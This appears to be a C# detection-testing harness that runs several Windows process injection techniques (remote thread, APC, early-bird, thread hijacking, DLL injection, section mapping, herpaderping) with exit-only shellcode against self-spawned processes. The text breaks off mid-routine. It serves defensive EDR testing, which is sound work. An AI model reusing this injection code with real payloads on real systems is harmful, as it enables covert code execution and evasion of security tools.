using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace InjectionHarness;

/// <summary>
/// Sandbox detection test harness for common Windows process injection patterns.
/// All actions target a self-spawned notepad.exe process and use benign
/// exit-only payloads so the VM is not harmed.
/// </summary>
internal class Program
{
    // Process / thread rights
    private const uint PROCESS_CREATE_THREAD = 0x0002;
    private const uint PROCESS_QUERY_INFORMATION = 0x0400;
    private const uint PROCESS_VM_OPERATION = 0x0008;
    private const uint PROCESS_VM_WRITE = 0x0020;
    private const uint PROCESS_VM_READ = 0x0010;
    private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;

    private const uint THREAD_ALL_ACCESS = 0x1F03FF;
    private const uint THREAD_SUSPEND_RESUME = 0x0002;
    private const uint THREAD_GET_CONTEXT = 0x0008;
    private const uint THREAD_SET_CONTEXT = 0x0010;
    private const uint THREAD_QUERY_INFORMATION = 0x0040;

    // Memory constants
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint MEM_RELEASE = 0x8000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_EXECUTE_READ = 0x20;
    private const uint PAGE_READWRITE = 0x04;
    private const uint PAGE_READONLY = 0x02;

    // Section constants
    private const uint SECTION_ALL_ACCESS = 0xF001F;
    private const uint PROCESS_CREATE_FLAGS_INHERIT_HANDLES = 0x00000004;
    private const uint SEC_COMMIT = 0x08000000;
    private const uint SEC_IMAGE = 0x01000000;
    private static readonly IntPtr CURRENT_PROCESS = (IntPtr)(-1);
    private static readonly IntPtr INVALID_HANDLE_VALUE = (IntPtr)(-1);

    // Hook constants
    private const int WH_GETMESSAGE = 3;

    // File constants
    private const uint GENERIC_READ = 0x80000000;
    private const uint GENERIC_WRITE = 0x40000000;
    private const uint FILE_EXECUTE = 0x00000020;
    private const uint FILE_SHARE_READ = 0x00000001;
    private const uint FILE_SHARE_WRITE = 0x00000002;
    private const uint FILE_SHARE_DELETE = 0x00000004;
    private const uint DELETE = 0x00010000;
    private const uint OPEN_EXISTING = 3;
    private const uint FILE_ATTRIBUTE_NORMAL = 0x00000080;
    private const uint FILE_FLAG_DELETE_ON_CLOSE = 0x04000000;

    // Context flags
    private const uint CONTEXT_AMD64 = 0x100000;
    private const uint CONTEXT_CONTROL = 0x1;
    private const uint CONTEXT_INTEGER = 0x2;
    private const uint CONTEXT_SEGMENTS = 0x4;
    private const uint CONTEXT_FLOATING_POINT = 0x8;
    private const uint CONTEXT_DEBUG_REGISTERS = 0x10;
    private const uint CONTEXT_EXTENDED_REGISTERS = 0x20;
    private const uint CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS | CONTEXT_AMD64;
    private const uint CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_FLOATING_POINT | CONTEXT_AMD64;

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint GetProcessId(IntPtr hProcess);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    private static extern IntPtr LoadLibraryA(string lpLibFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress);

    [DllImport("ntdll.dll")]
    private static extern int NtCreateSection(out IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes, ref long MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);

    [DllImport("ntdll.dll")]
    private static extern int NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, IntPtr SectionOffset, ref long ViewSize, int InheritDisposition, uint AllocationType, uint Win32Protect);

    [DllImport("ntdll.dll")]
    private static extern int NtCreateThreadEx(out IntPtr hThread, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr bytesBuffer);

    [DllImport("ntdll.dll")]
    private static extern int NtCreateProcessEx(out IntPtr ProcessHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ParentProcess, uint Flags, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort, uint JobMemberLevel);

    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref PROCESS_BASIC_INFORMATION ProcessInformation, int ProcessInformationLength, out int ReturnLength);

    [DllImport("ntdll.dll")]
    private static extern int RtlCreateProcessParametersEx(out IntPtr pProcessParameters, ref UNICODE_STRING ImagePathName, ref UNICODE_STRING DllPath, ref UNICODE_STRING CurrentDirectory, ref UNICODE_STRING CommandLine, IntPtr Environment, ref UNICODE_STRING WindowTitle, ref UNICODE_STRING DesktopInfo, ref UNICODE_STRING ShellInfo, ref UNICODE_STRING RuntimeData, uint Flags);

    [DllImport("ntdll.dll", EntryPoint = "RtlCreateProcessParametersEx")]
    private static extern int RtlCreateProcessParametersExNullOpt(out IntPtr pProcessParameters, ref UNICODE_STRING ImagePathName, IntPtr DllPath, IntPtr CurrentDirectory, ref UNICODE_STRING CommandLine, IntPtr Environment, IntPtr WindowTitle, IntPtr DesktopInfo, IntPtr ShellInfo, IntPtr RuntimeData, uint Flags);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool FlushFileBuffers(IntPtr hFile);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern ushort GlobalAddAtomW(string lpString);

    [DllImport("kernel32.dll")]
    private static extern ushort GlobalDeleteAtom(ushort nAtom);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, IntPtr lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool PostThreadMessage(uint idThread, uint Msg, IntPtr wParam, IntPtr lParam);

    [DllImport("ntdll.dll")]
    private static extern int NtQueueApcThreadEx(IntPtr ThreadHandle, IntPtr UserApcReserveHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

    private enum FILE_INFO_BY_HANDLE_CLASS
    {
        FileDispositionInfo = 4
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct FILE_DISPOSITION_INFO
    {
        [MarshalAs(UnmanagedType.Bool)]
        public bool DeleteFile;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetFileInformationByHandle(IntPtr hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, ref FILE_DISPOSITION_INFO lpFileInformation, uint dwBufferSize);

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x4D0)]
    private struct CONTEXT64
    {
        [FieldOffset(0x00)] public ulong P1Home;
        [FieldOffset(0x08)] public ulong P2Home;
        [FieldOffset(0x10)] public ulong P3Home;
        [FieldOffset(0x18)] public ulong P4Home;
        [FieldOffset(0x20)] public ulong P5Home;
        [FieldOffset(0x28)] public ulong P6Home;
        [FieldOffset(0x30)] public uint ContextFlags;
        [FieldOffset(0x34)] public uint MxCsr;
        [FieldOffset(0x38)] public ushort SegCs;
        [FieldOffset(0x3A)] public ushort SegDs;
        [FieldOffset(0x3C)] public ushort SegEs;
        [FieldOffset(0x3E)] public ushort SegFs;
        [FieldOffset(0x40)] public ushort SegGs;
        [FieldOffset(0x42)] public ushort SegSs;
        [FieldOffset(0x44)] public uint EFlags;
        [FieldOffset(0x48)] public ulong Dr0;
        [FieldOffset(0x50)] public ulong Dr1;
        [FieldOffset(0x58)] public ulong Dr2;
        [FieldOffset(0x60)] public ulong Dr3;
        [FieldOffset(0x68)] public ulong Dr6;
        [FieldOffset(0x70)] public ulong Dr7;
        [FieldOffset(0x78)] public ulong Rax;
        [FieldOffset(0x80)] public ulong Rcx;
        [FieldOffset(0x88)] public ulong Rdx;
        [FieldOffset(0x90)] public ulong Rbx;
        [FieldOffset(0x98)] public ulong Rsp;
        [FieldOffset(0xA0)] public ulong Rbp;
        [FieldOffset(0xA8)] public ulong Rsi;
        [FieldOffset(0xB0)] public ulong Rdi;
        [FieldOffset(0xB8)] public ulong R8;
        [FieldOffset(0xC0)] public ulong R9;
        [FieldOffset(0xC8)] public ulong R10;
        [FieldOffset(0xD0)] public ulong R11;
        [FieldOffset(0xD8)] public ulong R12;
        [FieldOffset(0xE0)] public ulong R13;
        [FieldOffset(0xE8)] public ulong R14;
        [FieldOffset(0xF0)] public ulong R15;
        [FieldOffset(0xF8)] public ulong Rip;
        // Padding to match OS CONTEXT size.
    }

    private static void Log(string msg) => Console.WriteLine($"[{DateTime.UtcNow:O}] {msg}");

    private static void Win32Check(bool ok, string action)
    {
        if (!ok) throw new Win32Exception(Marshal.GetLastWin32Error(), action);
    }

    private static IntPtr GetExport(string module, string proc)
    {
        IntPtr h = GetModuleHandle(module);
        if (h == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), $"GetModuleHandle({module})");
        IntPtr p = GetProcAddress(h, proc);
        if (p == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), $"GetProcAddress({proc})");
        return p;
    }

    private static Process SpawnTarget()
    {
        var psi = new ProcessStartInfo("cmd.exe", "/c ping 127.0.0.1 -n 100 > nul")
        {
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = false,
            RedirectStandardError = false
        };
        var p = Process.Start(psi)!;
        Thread.Sleep(500);
        return p;
    }

    /// <summary>
    /// T1055.002 / classic remote thread injection.
    /// Creates a remote thread whose start address is ExitProcess.
    /// The target process exits harmlessly.
    /// </summary>
    private static void TestRemoteThreadInjection(Process target)
    {
        Log("[T1055] Remote thread injection: OpenProcess -> CreateRemoteThread(ExitProcess)");
        IntPtr hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, target.Id);
        if (hProcess == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess");
        try
        {
            IntPtr exitProcess = GetExport("kernel32.dll", "ExitProcess");
            IntPtr tid = IntPtr.Zero;
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, UIntPtr.Zero, exitProcess, IntPtr.Zero, 0, out tid);
            if (hThread == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateRemoteThread");
            Log($"[T1055] Remote thread created, tid={tid}");
            WaitForSingleObject(hThread, 3000);
            CloseHandle(hThread);
        }
        finally
        {
            CloseHandle(hProcess);
        }
    }

    /// <summary>
    /// T1055.004 APC injection.
    /// Creates an alertable remote thread (SleepEx(INFINITE, TRUE)),
    /// then queues ExitProcess as an APC routine.
    /// </summary>
    private static void TestApcInjection(Process target)
    {
        Log("[T1055.004] APC injection: alertable thread + QueueUserAPC(ExitProcess)");
        IntPtr hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, target.Id);
        if (hProcess == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess");
        try
        {
            IntPtr sleepEx = GetExport("kernel32.dll", "SleepEx");

            // Shellcode: call SleepEx(0xFFFFFFFF, 1) to enter alertable wait.
            // mov rcx, 0xFFFFFFFF  (7 bytes)
            // mov rdx, 1           (7 bytes)
            // mov r8, SleepEx      (10 bytes)
            // call r8              (3 bytes)
            // ret                  (1 byte)
            byte[] shellcode = new byte[28];
            Buffer.BlockCopy(new byte[] { 0x48, 0xC7, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF }, 0, shellcode, 0, 7); // mov rcx, -1
            Buffer.BlockCopy(new byte[] { 0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00 }, 0, shellcode, 7, 7); // mov rdx, 1
            shellcode[14] = 0x49;
            shellcode[15] = 0xB8;
            Buffer.BlockCopy(BitConverter.GetBytes((ulong)sleepEx.ToInt64()), 0, shellcode, 16, 8); // mov r8, SleepEx
            shellcode[24] = 0x41;
            shellcode[25] = 0xFF;
            shellcode[26] = 0xD0; // call r8
            shellcode[27] = 0xC3; // ret

            IntPtr remoteMem = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remoteMem == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualAllocEx");
            try
            {
                UIntPtr written;
                Win32Check(WriteProcessMemory(hProcess, remoteMem, shellcode, (UIntPtr)shellcode.Length, out written), "WriteProcessMemory");

                IntPtr tid = IntPtr.Zero;
                IntPtr hAlertableThread = CreateRemoteThread(hProcess, IntPtr.Zero, UIntPtr.Zero, remoteMem, IntPtr.Zero, 0, out tid);
                if (hAlertableThread == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateRemoteThread (alertable)");
                try
                {
                    Thread.Sleep(500);
                    IntPtr exitProcess = GetExport("kernel32.dll", "ExitProcess");
                    uint result = QueueUserAPC(exitProcess, hAlertableThread, IntPtr.Zero);
                    if (result == 0) throw new Win32Exception(Marshal.GetLastWin32Error(), "QueueUserAPC");
                    Log($"[T1055.004] APC queued to alertable thread tid={tid}");
                    WaitForSingleObject(hAlertableThread, 3000);
                }
                finally
                {
                    CloseHandle(hAlertableThread);
                }
            }
            finally
            {
                VirtualFreeEx(hProcess, remoteMem, UIntPtr.Zero, MEM_RELEASE);
            }
        }
        finally
        {
            CloseHandle(hProcess);
        }
    }

    /// <summary>
    /// T1055.003 Thread hijacking.
    /// Suspends the target's main thread, redirects RIP to a harmless
    /// ExitProcess shellcode, and resumes.
    /// </summary>
    private static void TestThreadHijacking(Process target)
    {
        Log("[T1055.003] Thread hijacking: SuspendThread -> SetThreadContext(Rip=ExitProcess shellcode) -> ResumeThread");
        IntPtr hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, target.Id);
        if (hProcess == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess");
        try
        {
            IntPtr exitProcess = GetExport("kernel32.dll", "ExitProcess");

            // Shellcode: call ExitProcess(0); ret
            byte[] shellcode = new byte[14];
            shellcode[0] = 0x49;
            shellcode[1] = 0xB8;
            Buffer.BlockCopy(BitConverter.GetBytes((ulong)exitProcess.ToInt64()), 0, shellcode, 2, 8);
            shellcode[10] = 0x41;
            shellcode[11] = 0xFF;
            shellcode[12] = 0xD0;
            shellcode[13] = 0xC3;

            IntPtr remoteMem = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remoteMem == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualAllocEx");
            try
            {
                UIntPtr written;
                Win32Check(WriteProcessMemory(hProcess, remoteMem, shellcode, (UIntPtr)shellcode.Length, out written), "WriteProcessMemory");

                ProcessThread mainThread = target.Threads[0];
                IntPtr hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, false, (uint)mainThread.Id);
                if (hThread == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenThread");
                try
                {
                    uint suspendCount = SuspendThread(hThread);
                    if (suspendCount == 0xFFFFFFFF) throw new Win32Exception(Marshal.GetLastWin32Error(), "SuspendThread");
                    int ctxSize = Marshal.SizeOf(typeof(CONTEXT64));
                    Log($"[T1055.003] CONTEXT size = {ctxSize}");
                    Console.Out.Flush();
                    CONTEXT64 ctx = new CONTEXT64 { ContextFlags = CONTEXT_ALL };
                    Win32Check(GetThreadContext(hThread, ref ctx), "GetThreadContext");
                    ctx.Rip = (ulong)remoteMem.ToInt64();
                    Win32Check(SetThreadContext(hThread, ref ctx), "SetThreadContext");
                    Log($"[T1055.003] Main thread {mainThread.Id} redirected to shellcode");
                    ResumeThread(hThread);
                    WaitForSingleObject(hThread, 3000);
                }
                finally
                {
                    CloseHandle(hThread);
                }
            }
            finally
            {
                VirtualFreeEx(hProcess, remoteMem, UIntPtr.Zero, MEM_RELEASE);
            }
        }
        finally
        {
            CloseHandle(hProcess);
        }
    }

    /// <summary>
    /// T1055.004 Early-bird APC injection.
    /// Creates a suspended process and queues ExitProcess as an APC to the
    /// main thread before it ever runs. ResumeThread then executes the APC.
    /// </summary>
    private static void TestEarlyBirdApcInjection()
    {
        Log("[T1055.004] Early-bird APC injection: CreateProcess(suspended) -> QueueUserAPC(ExitProcess) -> ResumeThread");
        var si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(si);
        var pi = new PROCESS_INFORMATION();
        bool created = CreateProcess(null, "notepad.exe", IntPtr.Zero, IntPtr.Zero, false, 0x00000004 /* CREATE_SUSPENDED */, IntPtr.Zero, null, ref si, out pi);
        if (!created) throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateProcess");
        try
        {
            IntPtr exitProcess = GetExport("kernel32.dll", "ExitProcess");
            uint result = QueueUserAPC(exitProcess, pi.hThread, IntPtr.Zero);
            if (result == 0) throw new Win32Exception(Marshal.GetLastWin32Error(), "QueueUserAPC");
            Log("[T1055.004] APC queued to suspended main thread; resuming");
            ResumeThread(pi.hThread);
            WaitForSingleObject(pi.hProcess, 3000);
        }
        finally
        {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }

    /// <summary>
    /// T1055.001 Classic DLL injection.
    /// Extracts a benign native DLL from the harness resources, writes its
    /// path into the target process, and creates a remote thread that calls
    /// LoadLibraryA. The DLL simply calls ExitProcess(0).
    /// </summary>
    private static void TestDllInjection()
    {
        Log("[T1055.001] DLL injection: VirtualAllocEx(path) -> CreateRemoteThread(LoadLibraryA)");
        using Process target = SpawnTarget();
        Log($"[T1055.001] Target pid={target.Id}");
        IntPtr hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, target.Id);
        if (hProcess == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess");
        try
        {
            string dllPath = ExtractInjectedDll();
            byte[] pathBytes = Encoding.ASCII.GetBytes(dllPath + "\0");
            IntPtr remoteMem = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)pathBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (remoteMem == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualAllocEx");
            try
            {
                UIntPtr written;
                Win32Check(WriteProcessMemory(hProcess, remoteMem, pathBytes, (UIntPtr)pathBytes.Length, out written), "WriteProcessMemory");
                IntPtr loadLibrary = GetExport("kernel32.dll", "LoadLibraryA");
                IntPtr tid = IntPtr.Zero;
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, UIntPtr.Zero, loadLibrary, remoteMem, 0, out tid);
                if (hThread == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateRemoteThread");
                Log($"[T1055.001] Remote thread created for LoadLibraryA, tid={tid}");
                WaitForSingleObject(hThread, 3000);
                CloseHandle(hThread);
            }
            finally
            {
                VirtualFreeEx(hProcess, remoteMem, UIntPtr.Zero, MEM_RELEASE);
            }
        }
        finally
        {
            CloseHandle(hProcess);
        }
    }

    private static string ExtractInjectedDll() => ExtractEmbeddedResource("InjectedDll.dll", @"C:\Sandbox\InjectedDll.dll");

    private static string ExtractEmbeddedResource(string fileName, string dest)
    {
        Directory.CreateDirectory(Path.GetDirectoryName(dest)!);
        var asm = Assembly.GetExecutingAssembly();
        string? resourceName = asm.GetManifestResourceNames().FirstOrDefault(n => n.EndsWith(fileName));
        if (resourceName == null) throw new InvalidOperationException($"{fileName} resource not found");
        using var stream = asm.GetManifestResourceStream(resourceName)!;
        using var fs = new FileStream(dest, FileMode.Create, FileAccess.Write);
        stream.CopyTo(fs);
        return dest;
    }

    /// <summary>
    /// T1055 Shared-section mapping injection.
    /// Allocates a pagefile-backed section, maps it locally to write an
    /// ExitProcess payload, then maps the same section into a remote process
    /// as executable and starts a remote thread at the mapped address.
    /// </summary>
    private static void TestSectionMappingInjection()
    {
        Log("[T1055] Section mapping injection: NtCreateSection -> NtMapViewOfSection -> CreateRemoteThread");
        using Process target = SpawnTarget();
        Log($"[T1055] Target pid={target.Id}");

        IntPtr hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, target.Id);
        if (hProcess == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess");
        try
        {
            IntPtr exitProcess = GetExport("kernel32.dll", "ExitProcess");

            // Shellcode: call ExitProcess(0); ret
            byte[] shellcode = new byte[14];
            shellcode[0] = 0x49;
            shellcode[1] = 0xB8;
            Buffer.BlockCopy(BitConverter.GetBytes((ulong)exitProcess.ToInt64()), 0, shellcode, 2, 8);
            shellcode[10] = 0x41;
            shellcode[11] = 0xFF;
            shellcode[12] = 0xD0;
            shellcode[13] = 0xC3;

            long sectionSize = 4096;
            IntPtr hSection = IntPtr.Zero;
            int ntStatus = NtCreateSection(out hSection, SECTION_ALL_ACCESS, IntPtr.Zero, ref sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
            if (ntStatus != 0) throw new Win32Exception(ntStatus, "NtCreateSection");
            try
            {
                // Map writable view locally and copy payload.
                IntPtr localBase = IntPtr.Zero;
                long viewSize = sectionSize;
                ntStatus = NtMapViewOfSection(hSection, CURRENT_PROCESS, ref localBase, IntPtr.Zero, (IntPtr)sectionSize, IntPtr.Zero, ref viewSize, 2 /* ViewUnmap */, 0, PAGE_READWRITE);
                if (ntStatus != 0) throw new Win32Exception(ntStatus, "NtMapViewOfSection(local)");
                try
                {
                    Marshal.Copy(shellcode, 0, localBase, shellcode.Length);
                }
                finally
                {
                    NtUnmapViewOfSection(CURRENT_PROCESS, localBase);
                }

                // Map same section into target as executable.
                IntPtr remoteBase = IntPtr.Zero;
                long remoteViewSize = sectionSize;
                ntStatus = NtMapViewOfSection(hSection, hProcess, ref remoteBase, IntPtr.Zero, (IntPtr)sectionSize, IntPtr.Zero, ref remoteViewSize, 2 /* ViewUnmap */, 0, PAGE_EXECUTE_READ);
                if (ntStatus != 0) throw new Win32Exception(ntStatus, "NtMapViewOfSection(remote)");

                IntPtr tid = IntPtr.Zero;
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, UIntPtr.Zero, remoteBase, IntPtr.Zero, 0, out tid);
                if (hThread == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateRemoteThread");
                Log($"[T1055] Remote thread created in mapped section, tid={tid}");
                WaitForSingleObject(hThread, 3000);
                CloseHandle(hThread);
            }
            finally
            {
                CloseHandle(hSection);
            }
        }
        finally
        {
            CloseHandle(hProcess);
        }
    }

    /// <summary>
    /// T1055.012 Process herpaderping attempt.
    /// Writes a benign image to disk, creates a suspended process from it,
    /// then overwrites the file on disk with a different image before the
    /// first thread starts. This exercises Sysmon ProcessTampering/Event ID 25.
    /// </summary>
    private static void TestProcessHerpaderping()
    {
        Log("[T1055.012] Process herpaderping: NtCreateSection(decoy) -> overwrite same file -> NtCreateProcessEx -> NtCreateThreadEx");
        string decoyPath = @"C:\Sandbox\herpaderping.exe";
        string payloadPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmd.exe");
        string decoySource = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe");
        string commandLine = $@"""{decoyPath}""";

        IntPtr hSection = IntPtr.Zero;
        IntPtr hProcess = IntPtr.Zero;
        IntPtr hThread = IntPtr.Zero;
        IntPtr hFile = IntPtr.Zero;
        try
        {
            Directory.CreateDirectory(Path.GetDirectoryName(decoyPath)!);
            try { File.Delete(decoyPath); } catch { }
            File.Copy(decoySource, decoyPath, true);

            // Open the decoy with read+write+execute access so we can create an image
            // section and then overwrite the on-disk bytes through the same handle.
            hFile = CreateFile(decoyPath, GENERIC_READ | GENERIC_WRITE | FILE_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
            if (hFile == new IntPtr(-1))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateFile(decoy)");

            long maxSize = 0;
            // The public herpaderping PoC creates the image section as PAGE_READONLY.
            int status = NtCreateSection(out hSection, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_READONLY, SEC_IMAGE, hFile);
            if (status != 0)
                throw new InvalidOperationException($"NtCreateSection failed: 0x{status:X8}");

            int statusProc = NtCreateProcessEx(out hProcess, PROCESS_ALL_ACCESS, IntPtr.Zero, CURRENT_PROCESS, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, hSection, IntPtr.Zero, IntPtr.Zero, 0);
            if (statusProc != 0)
                throw new InvalidOperationException($"NtCreateProcessEx failed: 0x{statusProc:X8}");
            Log($"[T1055.012] Herpaderping target pid={GetProcessId(hProcess)}");

            // The cached image section is no longer needed once the process object exists.
            CloseHandle(hSection);
            hSection = IntPtr.Zero;

            // Capture the original entry point from the in-memory decoy before we
            // overwrite the on-disk file.
            IntPtr imageBase = ReadRemoteImageBase(hProcess);
            if (imageBase == IntPtr.Zero)
